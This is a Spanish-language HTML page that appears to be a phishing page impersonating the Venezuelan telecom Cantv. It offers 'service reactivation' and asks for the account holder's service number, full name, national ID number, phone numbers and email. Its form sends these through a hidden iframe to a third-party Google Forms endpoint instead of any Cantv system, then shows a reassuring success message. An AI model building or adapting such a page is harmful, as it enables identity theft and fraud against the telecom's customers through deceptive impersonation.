<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Registro de Servicio</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f4f6f9;
      color: #333333;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1.5rem;
      margin: 0;
      box-sizing: border-box;
    }

    .card {
      background: #ffffff;
      width: 100%;
      max-width: 480px;
      border-radius: 14px;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.06);
      overflow: hidden;
      margin: auto;
    }

    .card-banner {
      width: 100%;
      display: block;
      line-height: 0;
    }

    .card-banner img {
      width: 100%;
      height: auto;
      display: block;
      object-fit: cover;
    }

    .card-header {
      padding: 1.5rem 1.75rem 0.5rem 1.75rem;
      text-align: center;
    }

    .card-header h2 {
      margin: 0 0 0.35rem 0;
      color: #1e3a8a;
      font-size: 1.35rem;
      font-weight: 700;
      letter-spacing: -0.01em;
    }

    .card-header .subtitulo {
      font-size: 0.88rem;
      color: #64748b;
      margin: 0;
    }

    .card-body {
      padding: 1.25rem 1.75rem 1.75rem 1.75rem;
    }

    .campo {
      margin-bottom: 1.15rem;
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: 600;
      margin-bottom: 0.4rem;
      font-size: 0.9rem;
      color: #2d3748;
    }

    input {
      padding: 0.75rem;
      font-size: 0.95rem;
      border: 1px solid #cbd5e0;
      border-radius: 8px;
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
      box-sizing: border-box;
      width: 100%;
    }

    input:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
    }

    button {
      padding: 0.85rem;
      font-size: 1rem;
      cursor: pointer;
      background-color: #0032A1;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      width: 100%;
      transition: background-color 0.2s ease, opacity 0.2s ease;
      margin-top: 0.5rem;
    }

    button:hover:not(:disabled) {
      background-color: #002270;
    }

    button:disabled {
      background-color: #a0aec0;
      cursor: not-allowed;
      opacity: 0.8;
    }

    #mensaje {
      margin-top: 1.25rem;
      font-weight: 600;
      font-size: 0.92rem;
      text-align: center;
      min-height: 1.2rem;
    }
  </style>
</head>
<body>

  <div class="card">
    <!-- Banner superior -->
    <div class="card-banner">
      <img src="https://i.ibb.co/twVG3sNN/banner-cantv-tradicional.png" alt="banner-cantv-tradicional">
    </div>

    <!-- Título y subtítulo -->
    <div class="card-header">
      <h2>Reactivación de tu servicio Cantv</h2>
      <p class="subtitulo">Confirma tus datos para gestionar la reactivación.</p>
    </div>

    <!-- Campos del formulario -->
    <div class="card-body">
      <form id="miFormulario"
            action="https://docs.google.com/forms/d/e/1FAIpQLSdx5nLKsOm4EHEipdA_Nj6VlV09Wldb2wUkXRWQAxJkkOt1Ow/formResponse"
            method="POST"
            target="hidden_iframe">

        <div class="campo">
          <label for="servicio">Número del servicio:</label>
          <input type="text" id="servicio" name="entry.1500725622" placeholder="02125000000" required>
        </div>

        <div class="campo">
          <label for="nombre">Nombre y apellido del titular:</label>
          <input type="text" id="nombre" name="entry.287881507" placeholder="Nombre completo" required>
        </div>

        <div class="campo">
          <label for="cedula">Cédula de Identidad del titular:</label>
          <input type="text" id="cedula" name="entry.411099277" placeholder="12345678" required>
        </div>

        <div class="campo">
          <label for="celular1">Número celular de contacto (1):</label>
          <input type="tel" id="celular1" name="entry.1804223365" placeholder="04120000000" required>
        </div>

        <div class="campo">
          <label for="celular2">Número celular de contacto (2):</label>
          <input type="tel" id="celular2" name="entry.870009800" placeholder="04120000000 (Opcional)">
        </div>

        <div class="campo">
          <label for="correo">Correo electrónico:</label>
          <input type="email" id="correo" name="entry.580840075" placeholder="nombre@correo.com" required>
        </div>

        <button type="submit" id="btnEnviar">Enviar datos</button>
      </form>

      <!-- iframe oculto para procesar el envío sin recargar la página -->
      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

      <p id="mensaje"></p>
    </div>
  </div>

  <script>
    const form = document.getElementById('miFormulario');
    const mensaje = document.getElementById('mensaje');
    const btnEnviar = document.getElementById('btnEnviar');
    const iframe = document.getElementById('hidden_iframe');

    let enviado = false;

    form.addEventListener('submit', () => {
      btnEnviar.disabled = true;
      mensaje.style.color = '#555';
      mensaje.textContent = 'Enviando información...';
      enviado = true;
    });

    iframe.addEventListener('load', () => {
      if (enviado) {
        mensaje.style.color = '#0e7a0d';
        mensaje.textContent = '¡Tus datos se registraron correctamente!';
        btnEnviar.disabled = false;
        form.reset();
        enviado = false;
      }
    });
  </script>

</body>
</html>
